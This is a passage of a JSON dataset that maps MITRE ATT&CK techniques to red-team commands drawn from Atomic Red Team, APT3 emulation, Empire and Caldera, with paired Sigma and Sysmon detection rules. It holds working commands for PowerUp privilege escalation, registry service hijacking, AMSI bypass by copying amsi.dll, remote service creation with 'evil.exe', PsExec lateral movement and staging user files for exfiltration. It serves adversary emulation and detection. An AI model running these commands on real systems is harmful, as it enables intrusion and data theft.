#2": "T1044", "Technique": "Path Interception", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/allchecks\":  [\"T1034\",\"T1044\"],"}}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "powershell/privesc/powerup/allchecks", "powershell/privesc/powerup/allchecks"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1058", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1058/T1058.yaml", "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL\n", "name": null}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1058", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Metasploit": "exploit/windows/local/trusted_service_path", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it."}}, {"Atomic Red Team Test - Service Registry Permissions Weakness": {"attack_technique": "T1058", "display_name": "Service Registry Permissions Weakness", "atomic_tests": [{"name": "Service Registry Permissions Weakness", "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n", "supported_platforms": ["windows"], "input_arguments": {"weak_service_name": {"description": "weak service check", "type": "String", "default": "weakservicename"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n"}}]}}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1038", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1038/T1038.yaml", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/find_dllhijack", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/find_dllhijack", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/write_dllhijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/write_dllhijacker", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1038", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Metasploit": "exploit/windows/local/trusted_service_path", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it."}}, {"Atomic Red Team Test - DLL Search Order Hijacking": {"attack_technique": "T1038", "display_name": "DLL Search Order Hijacking", "atomic_tests": [{"name": "DLL Search Order Hijacking - amsi.dll", "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/find_dllhijack", "ATT&CK Technique #1": "T1038", "ATT&CK Technique #2": "", "Technique": "DLL Search Order Hijacking", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/find_dllhijack\":  [\"T1038\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/write_dllhijacker", "ATT&CK Technique #1": "T1038", "ATT&CK Technique #2": "", "Technique": "DLL Search Order Hijacking", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/write_dllhijacker\":  [\"T1038\"],"}}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "powershell/privesc/powerup/find_dllhijack", "powershell/privesc/powerup/find_dllhijack", "powershell/privesc/powerup/write_dllhijacker", "powershell/privesc/powerup/write_dllhijacker"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1035", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "name": "Cobalt Strike"}, {"source": "atomics/T1035/T1035.yaml", "command": "sc.exe create ARTService binPath= #{executable_command}\nsc.exe start ARTService\nsc.exe delete ARTService\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "sc.exe create #{service_name} binPath= %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "C:\\PSTools\\PsExec.exe \\\\#{remote_host} \"C:\\Windows\\System32\\calc.exe\"\n", "name": null}, {"source": "atomics/T1035/T1035.yaml", "command": "#{psexec_exe} \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "!=wininit", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "services.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "pcalua.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - Service Execution", "command": "\\\\Windows\\\\.+\\\\sc.exestart|create|query|config", "name": null}, {"source": "SysmonHunter - Service Execution", "command": "\\SYSTEM\\CurrentControlSet\\services", "name": null}, {"source": "SysmonHunter - Service Execution", "command": "\\SYSTEM\\CurrentControlSet\\services\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psexec", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psexec", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1035", "Built-in Windows Command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Cobalt Strike": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "Metasploit": "", "Description": "This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:\nsc \\\\COMP qc acachsrv\ndir \\\\COMP\\ADMIN$\\acachsrv.exe"}}, {"Atomic Red Team Test - Service Execution": {"attack_technique": "T1035", "display_name": "Service Execution", "atomic_tests": [{"name": "Execute a Command as a Service", "description": "Creates a service specifying an aribrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe create a new service using sc.exe create that will start powershell.exe to create a new file `art-marker.txt`\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of service to create", "type": "string", "default": "ARTService"}, "executable_command": {"description": "Command to execute as a service", "type": "string", "default": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc.exe create #{service_name} binPath= #{executable_command}\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n"}}, {"name": "Use PsExec to execute a command on a remote host", "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill run a command on a remote host.\n\nUpon successful execution, powershell will download psexec.exe and spawn calc.exe on a remote endpoint (default:localhost).\n", "supported_platforms": ["windows"], "input_arguments": {"psexec_exe": {"description": "Path to PsExec", "type": "string", "default": "C:\\PSTools\\PsExec.exe"}, "remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "localhost"}}, "dependencies": [{"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n", "prereq_command": "if (Test-Path \"#{psexec_exe}\") { exit 0} else { exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"$env:TEMP\\PsTools.zip\"\nExpand-Archive $env:TEMP\\PsTools.zip $env:TEMP\\PsTools -Force\nNew-Item -ItemType Directory (\"#{psexec_exe}\") -Force | Out-Null\nCopy-Item $env:TEMP\\PsTools\\PsExec.exe \"#{psexec_exe}\" -Force\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "#{psexec_exe} \\\\#{remote_host} \"C:\\Windows\\System32\\calc.exe\"\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100076", "os": "windows", "parent_process": "!=wininit", "commandline_string": "", "sub_process_1": "services.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "service_execution", "mitre_attack": "T1035", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100124", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "pcalua.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "service_execution", "mitre_attack": "T1035", "itw_sample": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Sobnot.A"}}, {"SysmonHunter - T1035": {"name": "Service Execution", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\sc.exe", "flag": "regex"}, "cmdline": {"pattern": "start|create|query|config"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\services"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\services"}}, "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe", "flag": "regex", "op": "not"}}, "op": "and"}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_psexec", "ATT&CK Technique #1": "T1035", "ATT&CK Technique #2": "T1077", "Technique": "Service Execution\u00a0", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_psexec\":  [\"T1035\",\"T1077\"],"}}], "command_list": ["Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "sc.exe create ARTService binPath= #{executable_command}\nsc.exe start ARTService\nsc.exe delete ARTService\n", "sc.exe create #{service_name} binPath= %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "C:\\PSTools\\PsExec.exe \\\\#{remote_host} \"C:\\Windows\\System32\\calc.exe\"\n", "#{psexec_exe} \\\\localhost \"C:\\Windows\\System32\\calc.exe\"\n", "!=wininit", "services.exe", "*.exe", "pcalua.exe", "\\\\Windows\\\\.+\\\\sc.exestart|create|query|config", "\\SYSTEM\\CurrentControlSet\\services", "\\SYSTEM\\CurrentControlSet\\services\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe", "powershell/lateral_movement/invoke_psexec", "powershell/lateral_movement/invoke_psexec"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "smbexec.py Service Installation", "id": "52a85084-6989-40c3-8f32-091e12e13f09", "description": "Detects the use of smbexec.py tool by detecting a specific service installation", "author": "Omer Faruk Celik", "date": "2018/03/20", "references": ["https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/"], "tags": ["attack.lateral_movement", "attack.execution", "attack.t1077", "attack.t1035"], "logsource": {"product": "windows", "service": "system"}, "detection": {"service_installation": {"EventID": 7045, "ServiceName": "BTOBTO", "ServiceFileName": "*\\execute.bat"}, "condition": "service_installation"}, "fields": ["ServiceName", "ServiceFileName"], "falsepositives": ["Penetration Test", "Unknown"], "level": "critical"}}, {"data_source": {"title": "PsExec Service Start", "id": "3ede524d-21cc-472d-a3ce-d21b568d8db7", "description": "Detects a PsExec service start", "author": "Florian Roth", "date": "2018/03/13", "modified": "2012/12/11", "tags": ["attack.execution", "attack.t1035", "attack.s0029"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ProcessCommandLine": "C:\\Windows\\PSEXESVC.exe"}, "condition": "selection"}, "falsepositives": ["Administrative activity"], "level": "low"}}, {"data_source": {"title": "Service Execution", "id": "2a072a96-a086-49fa-bcb5-15cc5a619093", "status": "experimental", "description": "Detects manual service execution (start) via system utilities", "author": "Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1035/T1035.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": ["\\net.exe", "\\net1.exe"], "CommandLine|contains": " start "}, "condition": "selection"}, "falsepositives": ["Legitimate administrator or user executes a service for legitimate reason"], "level": "low", "tags": ["attack.execution", "attack.t1035"]}}, {"data_source": {"action": "global", "title": "PsExec Tool Execution", "id": "42c575ea-e41e-41f1-b248-8093c3e82a28", "status": "experimental", "description": "Detects PsExec service installation and execution events (service and Sysmon)", "author": "Thomas Patzke", "references": ["https://www.jpcert.or.jp/english/pub/sr/ir_research.html", "https://jpcertcc.github.io/ToolAnalysisResultSheet"], "tags": ["attack.execution", "attack.t1035", "attack.s0029"], "detection": {"condition": "1 of them"}, "fields": ["EventID", "CommandLine", "ParentCommandLine", "ServiceName", "ServiceFileName"], "falsepositives": ["unknown"], "level": "low"}}, {"data_source": {"logsource": {"product": "windows", "service": "system"}, "detection": {"service_installation": {"EventID": 7045, "ServiceName": "PSEXESVC", "ServiceFileName": "*\\PSEXESVC.exe"}, "service_execution": {"EventID": 7036, "ServiceName": "PSEXESVC"}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"sysmon_processcreation": {"Image": "*\\PSEXESVC.exe", "User": "NT AUTHORITY\\SYSTEM"}}}}]}, {"technique_id": "T1002", "commands": [{"source": "atomics/T1002/T1002.yaml", "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1002-data-ps.zip\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r #{output_file} %USERPROFILE%\\*#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*.txt\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r %USERPROFILE%\\T1002-data.rar #{input_path}\\*#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "\"%programfiles%/WinRAR/Rar.exe\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "zip #{output_file} $HOME/*.txt\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "zip $HOME/data.zip #{input_files}\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "test -e #{input_file} && gzip -k #{input_file} || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> #{input_file}; gzip -k #{input_file})\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "tar -cvzf #{output_file} $HOME/$USERNAME\n", "name": null}, {"source": "atomics/T1002/T1002.yaml", "command": "tar -cvzf $HOME/data.tar.gz #{input_file_folder}\n", "name": null}, {"source": "data/abilities/exfiltration/300157e5-f4ad-4569-b533-9d1fa0e74d74.yml", "command": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "name": "Compress a directory on the file system"}, {"source": "Threat Hunting Tables", "command": "rar.exe", "name": "parent_process"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/zipfolder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/zipfolder", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Data Compressed": {"attack_technique": "T1002", "display_name": "Data Compressed", "atomic_tests": [{"name": "Compress Data for Exfiltration With PowerShell", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1002-data-ps.zip in the $env:USERPROFILE directory \n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path that should be compressed into our output file", "type": "Path", "default": "$env:USERPROFILE"}, "output_file": {"description": "Path where resulting compressed data should be placed", "type": "Path", "default": "$env:USERPROFILE\\T1002-data-ps.zip"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "cleanup_command": "Remove-Item -path #{output_file} -ErrorAction Ignore\n"}}, {"name": "Compress Data for Exfiltration With Rar", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1002-data.rar in the %USERPROFILE% directory \n", "supported_platforms": ["windows"], "input_arguments": {"input_path": {"description": "Path that should be compressed into our output file", "type": "Path", "default": "%USERPROFILE%"}, "file_extension": {"description": "Extension of files to compress", "type": "String", "default": ".txt"}, "output_file": {"description": "Path where resulting compressed data should be placed", "type": "Path", "default": "%USERPROFILE%\\T1002-data.rar"}, "rar_installer": {"description": "Winrar installer", "type": "Path", "default": "%TEMP%\\winrar.exe"}, "rar_exe": {"description": "The RAR executable from Winrar", "type": "Path", "default": "%programfiles%/WinRAR/Rar.exe"}}, "dependencies": [{"description": "Rar tool must be installed at specified location (#{rar_exe})\n", "prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n", "get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\necho Follow the installer prompts to install Winrar\n#{rar_installer}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"}}, {"name": "Data Compressed - nix - zip", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_files": {"description": "Path that should be compressed into our output file, may include wildcards", "type": "Path", "default": "$HOME/*.txt"}, "output_file": {"description": "Path that should be output as a zip archive", "type": "Path", "default": "$HOME/data.zip"}}, "dependencies": [{"description": "Files to zip must exist (#{input_files})\n", "prereq_command": "ls #{input_files}\n", "get_prereq_command": "echo Please set input_files argument to include files that exist\n"}], "executor": {"name": "sh", "elevation_required": false, "prereq_command": "ls #{input_files} > /dev/null\n", "command": "zip #{output_file} #{input_files}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "Data Compressed - nix - gzip Single File", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file": {"description": "Path that should be compressed", "type": "Path", "default": "$HOME/victim-gzip.txt"}, "input_content": {"description": "contents of compressed files if file does not already exist. default contains test credit card and social security number", "type": "String", "default": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101"}}, "executor": {"name": "sh", "elevation_required": false, "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n", "cleanup_command": "rm -f #{input_file}.gz\n"}}, {"name": "Data Compressed - nix - tar Folder or File", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file_folder": {"description": "Path that should be compressed", "type": "Path", "default": "$HOME/$USERNAME"}, "output_file": {"description": "File that should be output", "type": "Path", "default": "$HOME/data.tar.gz"}}, "dependencies": [{"description": "Folder to zip must exist (#{input_file_folder})\n", "prereq_command": "test -e #{input_file_folder}\n", "get_prereq_command": "echo Please set input_file_folder argument to a folder that exists\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "tar -cvzf #{output_file} #{input_file_folder}\n", "cleanup_command": "rm -f #{output_file}\n"}}]}}, {"Mitre Stockpile - Compress a directory on the file system": {"id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "name": "Compress staged directory", "description": "Compress a directory on the file system", "tactic": "exfiltration", "technique": {"attack_id": "T1002", "name": "Data Compressed"}, "platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.staged"}]}]}}, {"Threat Hunting Tables": {"chain_id": "100067", "os": "windows", "parent_process": "rar.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "data_compressed", "mitre_attack": "T1002", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/zipfolder", "ATT&CK Technique #1": "T1002", "ATT&CK Technique #2": "", "Technique": "Data Compressed", "Concatenate for Python Dictionary": "\"powershell/management/zipfolder\":  [\"T1002\"],"}}], "command_list": ["dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1002-data-ps.zip\n", "\"#{rar_exe}\" a -r #{output_file} 